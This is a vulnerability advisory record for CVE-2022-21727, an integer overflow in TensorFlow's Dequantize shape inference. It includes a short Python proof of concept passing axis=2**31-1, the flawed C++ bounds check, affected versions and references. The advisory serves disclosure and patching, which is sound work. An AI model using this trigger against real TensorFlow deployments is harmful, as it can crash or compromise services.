advisory_id: pypi/tensorflow-cpu/CVE-2022-21727
datasource_id: gitlab_importer_v2/pypi/tensorflow-cpu/CVE-2022-21727
datasource_url: https://gitlab.com/gitlab-org/advisories-community/-/blob/main/pypi/tensorflow-cpu/CVE-2022-21727.yml
aliases:
  - CVE-2022-21727
  - GHSA-c6fh-56w7-fvjw
summary: |
  Integer overflow in Tensorflow
  The [implementation of shape inference for `Dequantize`](https://github.com/tensorflow/tensorflow/blob/5100e359aef5c8021f2e71c7b986420b85ce7b3d/tensorflow/core/ops/array_ops.cc#L3001-L3034) is vulnerable to an integer overflow weakness:

  ```python
  import tensorflow as tf

  input = tf.constant([1,1],dtype=tf.qint32)

  @tf.function
  def test():
  y = tf.raw_ops.Dequantize(
  input=input,
  min_range=[1.0],
  max_range=[10.0],
  mode='MIN_COMBINED',
  narrow_range=False,
  axis=2**31-1,
  dtype=tf.bfloat16)
  return y

  test()
  ```

  The `axis` argument can be `-1` (the default value for the optional argument) or any other positive value at most the number of dimensions of the input. Unfortunately, the upper bound is not checked, and, since the code computes `axis + 1`, an attacker can trigger an integer overflow:

  ```cc
  int axis = -1;
  Status s = c->GetAttr("axis", &axis);
  // ...
  if (axis < -1) {
  return errors::InvalidArgument("axis should be at least -1, got ",
  axis);
  }
  // ...
  if (axis != -1) {
  ShapeHandle input;
  TF_RETURN_IF_ERROR(c->WithRankAtLeast(c->input(0), axis + 1, &input));
  // ...
  }
  ```
impacted_packages:
  - purl: pkg:pypi/tensorflow-cpu
    affected_versions: vers:pypi/<2.5.3|>=2.6.0|<2.6.3|2.7.0|>=2.7.0|<2.7.1
    fixed_versions: vers:pypi/2.5.3|2.6.3|2.7.1
    fixed_in_commits: []
    introduced_in_commits: []
severities:
  - score:
    scoring_system: cvssv2
    scoring_elements: AV:N/AC:L/Au:S/C:P/I:P/A:P
    published_at: None
    url: https://gitlab.com/gitlab-org/advisories-community/-/blob/main/pypi/tensorflow-cpu/CVE-2022-21727.yml
  - score:
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
    published_at: None
    url: https://gitlab.com/gitlab-org/advisories-community/-/blob/main/pypi/tensorflow-cpu/CVE-2022-21727.yml
weaknesses:
  - CWE-190
  - CWE-1035
  - CWE-937
references:
  - url: https://github.com/pypa/advisory-database/tree/main/vulns/tensorflow-cpu/PYSEC-2022-51.yaml
    reference_type:
    reference_id:
  - url: https://github.com/pypa/advisory-database/tree/main/vulns/tensorflow-gpu/PYSEC-2022-106.yaml
    reference_type:
    reference_id:
  - url: https://github.com/tensorflow/tensorflow
    reference_type:
    reference_id:
  - url: https://github.com/tensorflow/tensorflow/blob/5100e359aef5c8021f2e71c7b986420b85ce7b3d/tensorflow/core/ops/array_ops.cc#L3001-L3034
    reference_type:
    reference_id:
  - url: https://github.com/tensorflow/tensorflow/commit/b64638ec5ccaa77b7c1eb90958e3d85ce381f91b
    reference_type:
    reference_id:
  - url: https://github.com/tensorflow/tensorflow/security/advisories/GHSA-c6fh-56w7-fvjw
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/detail/CVE-2022-21727
    reference_type:
    reference_id: CVE-2022-21727
  - url: https://github.com/advisories/GHSA-c6fh-56w7-fvjw
    reference_type:
    reference_id: GHSA-c6fh-56w7-fvjw
